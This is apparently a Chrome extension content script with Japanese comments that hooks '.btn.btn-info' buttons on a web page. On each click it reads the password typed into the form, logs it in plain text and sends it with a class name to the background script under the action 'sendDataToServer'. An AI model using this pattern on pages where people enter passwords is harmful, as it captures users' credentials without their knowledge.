console.log("Content script loaded!");

// class属性が "btn" である button タイプの要素を取得
const s_buttons = document.querySelectorAll(".btn.btn-info");

// ボタンが存在しない場合の処理
if (s_buttons.length === 0) {
  console.log("ボタンが見つかりませんでした");
}

// クリック時の処理
const handleClick = function() {
  console.log('表示ボタンが押されました');

  // ボタンがクリックされたときの処理
  const psw = this.closest("form").querySelector("input[type=password]").value;
  const resizeTarget = document.getElementById('resizeTarget').querySelector('.mainttl2 span');

  console.log("class_name:", resizeTarget.textContent);
  console.log("password:", psw);

  // ボタンが押されたらバックグラウンドスクリプトにデータを送信
  chrome.runtime.sendMessage({ action: "sendDataToServer", data: { password: psw, className: resizeTarget.textContent } });

  // 3秒後に実行する処理
  setTimeout(function() {
    console.log("3秒経過しました!");
    // ここに実行したいコードを追加
    s_buttons.forEach(function (button) {
      // ボタンがクリックされたときの処理
      const psw = button.closest("form").querySelector("input[type=password]").value;
      const resizeTarget = document.getElementById('resizeTarget').querySelector('.mainttl2 span');
      console.log("class_name:", resizeTarget.textContent);
      console.log("password:", psw);
    });
  }, 3000);
};

// ボタンが存在する場合は、クリックイベントリスナーを設定
s_buttons.forEach(function(button) {
  button.addEventListener('click', handleClick);
});

chrome.runtime.sendMessage({ action: "sendDataToServer", data: "test" });

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.action === "sendDataToPopup") {
    // メッセージが受信されたときの処理
    console.log("Data received in popup.js:", request.data);
  }
});
